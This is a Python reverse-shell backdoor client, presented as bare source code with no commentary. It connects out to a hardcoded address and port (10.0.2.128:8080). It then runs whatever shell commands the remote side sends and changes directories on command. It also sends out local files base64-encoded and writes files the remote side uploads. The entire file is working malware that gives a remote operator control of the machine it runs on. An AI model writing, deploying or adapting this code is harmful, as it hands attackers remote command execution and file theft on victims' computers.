import socket
import subprocess
import os
import base64
import simplejson

class Socket:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def command_execution(self, command):
		return subprocess.check_output(command, shell=True)

	def json_send(self, data):
		json_data = simplejson.dumps(data, encoding="latin-1")
		self.connection.send(json_data.encode("latin-1"))

	def json_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024).decode("latin-1")
				return simplejson.loads(json_data.encode("latin-1"))
			except ValueError:
				continue

	def cd_execute_command(self, directory):
		os.chdir(directory)
		return "cd to" + directory

	def get_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	def save_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "Opload OK!"

	def start_socket(self):
		while True:
			command = self.json_receive()
			try:
				if command[0] == "quit":
					self.connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					output = self.cd_execute_command(command[1])
				elif command[0] == "download":
					output = self.get_file(command[1])
				elif command[0] == "upload":
					output = self.save_file(command[1], command[2])
				else:
					output = self.command_execution(command)
			except Exception:
				output = "Error!"
			self.json_send(output)
		self.connection.close()

socket_object = Socket("10.0.2.128", 8080)
socket_object.start_socket()